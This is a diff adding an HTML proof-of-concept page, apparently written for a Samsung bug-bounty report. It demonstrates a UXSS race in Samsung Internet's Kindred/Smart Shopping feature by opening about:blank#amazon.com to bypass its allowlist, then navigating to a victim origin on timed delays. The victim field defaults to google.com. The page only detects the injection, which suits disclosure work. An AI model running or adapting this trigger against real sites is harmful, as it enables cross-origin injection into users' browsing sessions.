@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Kindred UXSS</title>
+<style>
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.45;color:#111}
+ h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
+ pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:11px;white-space:pre-wrap;word-break:break-all}
+ input{width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0}
+ button{font-size:14px;padding:11px;width:100%;border:1px solid #dcdce2;border-radius:8px;background:#fff;margin:5px 0}
+ code{background:#eee;padding:1px 5px;border-radius:4px}
+ .warn{color:#b23;font-size:11px}
+ #banner{display:none;background:#c0392b;color:#fff;padding:12px;border-radius:8px;font-weight:700;font-size:13px;margin-bottom:10px}
+ .hide{display:none}
+</style>
+</head>
+<body>
+<div id="banner"></div>
+
+<!-- ================= TRIGGER MODE (origin A = attacker) ================= -->
+<div id="trigUI" class="hide">
+ <h1>Samsung Internet — Kindred / Smart-Shopping UXSS (benign)</h1>
+ <p style="font-size:12px;color:#666">Authorized research. Open in <b>Samsung Internet</b> with <b>Smart Shopping / Shopping assistant ON</b>.
+ This page (origin A) triggers the Kindred allowlist bypass on <code>about:blank#amazon.com</code>, then races a
+ navigation to a VICTIM page (origin B — the SAME file with <code>?role=victim</code>). If the async Kindred callback
+ lands after the navigation, it injects into origin B — detected there. No third party, no data read.</p>
+
+ <h2>victim URL (target context — per your logic: google.com)</h2>
+ <input id="victim" value="https://google.com/">
+ <h2>allowlist-bypass trigger URL</h2>
+ <input id="trig" value="about:blank#amazon.com">
+ <h2>race delay before navigating to victim (ms)</h2>
+ <input id="delay" value="120">
+ <button onclick="run()">run allowlist-bypass + race</button>
+ <button onclick="runLoop()">run x8 (sweep delays 30–240ms)</button>
+</div>
+
+<!-- ================= VICTIM MODE (origin B = target) ================= -->
+<div id="victimUI" class="hide">
+ <h1>Benign victim page (origin B)</h1>
+ <p style="font-size:12px;color:#666">Stands in for the real target (google.com in the write-up). If Kindred's callback
+ — triggered on <code>about:blank#amazon.com</code> in the opener — lands HERE after navigation, it injects into this
+ origin. That cross-origin injection is the UXSS primitive. Detection only; no attacker code executed.</p>
+ <p>origin(B) = <code id="o"></code> · domain = <code id="d"></code></p>
+</div>
+
+<h2>log</h2><pre id="log"></pre>
+<p class="warn">Benign: navigates only your own origins; proof = document.domain + injected-artifact detection on B. Own test build. Report to Samsung Mobile Security Rewards.</p>
+
+<script>
+function g(id){return document.getElementById(id);}
+var L=g('log'); function log(m){try{L.textContent=m+'\n'+L.textContent;}catch(e){}}
+var IS_VICTIM = /[?&]role=victim\b/.test(location.search) || /(^|[#&])victim\b/.test(location.hash);
+
+/* =================== VICTIM MODE =================== */
+function startVictim(){
+  g('victimUI').classList.remove('hide');
+  var ORG=location.origin, DOM=document.domain;
+  g('o').textContent=ORG; g('d').textContent=DOM;
+  log('VICTIM loaded. origin='+ORG+' domain='+DOM+' SamsungBrowser='+/SamsungBrowser/.test(navigator.userAgent));
+
+  function report(what){
+    var b=g('banner'); b.style.display='block';
+    b.textContent='⚠ KINDRED / SMART-SHOPPING INJECTED into '+ORG+' (domain='+DOM+') — '+what+
+      '. Navigated here AFTER about:blank#amazon.com triggered the feature => cross-origin injection = UXSS primitive.';
+    document.title='INJECTED '+DOM;
+    log('*** INJECTION DETECTED: '+what+' ***');
+  }
+  var RE=/kindred|smart.?shop|shopping|samsung|sbrowser|coupon|cashback|price|assistant|deal/i;
+
+  // 1) new window globals (Kindred often drops a bridge/global)
+  var base={}; for(var k in window) base[k]=1;
+  setInterval(function(){
+    for(var k in window){ if(!base[k]){ base[k]=1;
+      if(RE.test(k)) report('new global window.'+k); else log('new global (neutral): '+k);
+    } }
+  },150);
+
+  // 2) injected DOM nodes (script/overlay/UI the feature adds)
+  try{
+    new MutationObserver(function(muts){
+      for(var j=0;j<muts.length;j++){ var mn=muts[j].addedNodes;
+        for(var i=0;i<mn.length;i++){ var n=mn[i]; if(n.nodeType!==1) continue;
+          var sig=(n.tagName||'')+' id='+(n.id||'')+' cls='+(n.className||'')+' src='+((n.getAttribute&&n.getAttribute('src'))||'');
+          if(RE.test(sig)) report('injected DOM: '+sig.slice(0,140)); else log('DOM added: '+sig.slice(0,90));
+        }
+      }
+    }).observe(document.documentElement,{childList:true,subtree:true});
+  }catch(e){ log('observer err '+e); }
+  log('watching for cross-origin Kindred injection… (keep this tab open)');
+}
+
+/* =================== TRIGGER MODE (my logic) =================== */
+function startTrigger(){
+  g('trigUI').classList.remove('hide');
+  var m=/SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
+  log('TRIGGER. SamsungBrowser='+(m?m[1]:'NOT DETECTED — open in Samsung Internet')+'  origin(A)='+location.origin);
+}
+
+function fire(trig, victim, delay){
+  var w = window.open(trig, '_blank');          // about:blank#amazon.com -> Kindred allowlist match (bypass)
+  if(!w){ log('popup blocked — allow popups'); return; }
+  log('opened "'+trig+'" (allowlist bypass). Kindred schedules async native callback. nav->victim in '+delay+'ms');
+  setTimeout(function(){
+    try{ w.location.href = victim; log('  navigated child to origin B. If callback arrives NOW => injects into B = UXSS'); }
+    catch(e){ log('  nav err '+e); }
+  }, delay);
+}
+function run(){
+  fire((g('trig').value||'about:blank#amazon.com').trim(),
+       (g('victim').value||'').trim(),
+       Math.max(0,parseInt(g('delay').value||'120',10)||120));
+}
+function runLoop(){
+  var trig=(g('trig').value||'about:blank#amazon.com').trim();
+  var victim=(g('victim').value||'').trim();
+  var delays=[30,60,90,120,150,180,210,240], k=0;
+  log('sweeping race delays '+delays.join(',')+' (one child per 1.5s)…');
+  var iv=setInterval(function(){ if(k>=delays.length){clearInterval(iv);log('sweep done');return;} fire(trig,victim,delays[k++]); },1500);
+}
+
+/* =================== dispatch =================== */
+if(IS_VICTIM) startVictim(); else startTrigger();
+</script>
+</body>
+</html>
